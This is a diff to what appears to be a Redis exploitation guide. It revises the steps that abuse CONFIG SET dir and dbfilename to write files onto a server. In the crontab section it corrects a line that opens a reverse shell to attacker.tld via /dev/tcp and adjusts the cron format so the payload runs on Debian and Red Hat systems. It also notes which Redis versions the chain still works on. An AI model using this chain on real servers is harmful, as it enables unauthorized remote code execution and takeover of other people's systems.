@@ -18,7 +18,7 @@ Redis persists its dataset to an RDB file whose directory and filename are runti
 
 ## The core chain
 
-Four steps: relocate the dump directory, name the dump file, store the payload as a key, and flush to disk.
+Four steps: relocate the dump directory, name the dump file, store the payload as a key, and flush to disk. On Redis 7.0 and later, `dir` and `dbfilename` are protected configuration parameters: `CONFIG SET` of them is refused unless the server was started with `enable-protected-configs yes`. The chain applies to older Redis, or to 7.x where protected configs have been enabled.
 
 ```
 CONFIG SET dir /var/www/html
@@ -64,11 +64,11 @@ On systems whose cron reads drop-in files, write a crontab that spawns a reverse
 ```
 CONFIG SET dir /var/spool/cron/crontabs
 CONFIG SET dbfilename root
-SET job "\n\n* * * * * root bash -i >& /dev/tcp/attacker.tld/4444 0>&1\n\n"
+SET job "\n\n* * * * * bash -i >& /dev/tcp/attacker.tld/4444 0>&1\n\n"
 SAVE
 ```
 
-Path and format vary by distribution: `/var/spool/cron/crontabs/<user>` on Debian-family systems, `/var/spool/cron/<user>` on Red Hat-family systems, and `/etc/cron.d/<name>` for system drop-ins (which require a user field in the line, as shown). cron tolerates the malformed binary lines and runs the valid schedule line.
+Path and format vary by distribution. `/var/spool/cron/crontabs/<user>` on Debian-family systems and `/var/spool/cron/<user>` on Red Hat-family systems are per-user crontabs and take no username field (the schedule is followed directly by the command, as above). System drop-ins under `/etc/cron.d/<name>` do require a username field (`* * * * * root bash ...`). cron tolerates the malformed binary lines and runs the valid schedule line.
 
 ## Full smuggled sequence
 
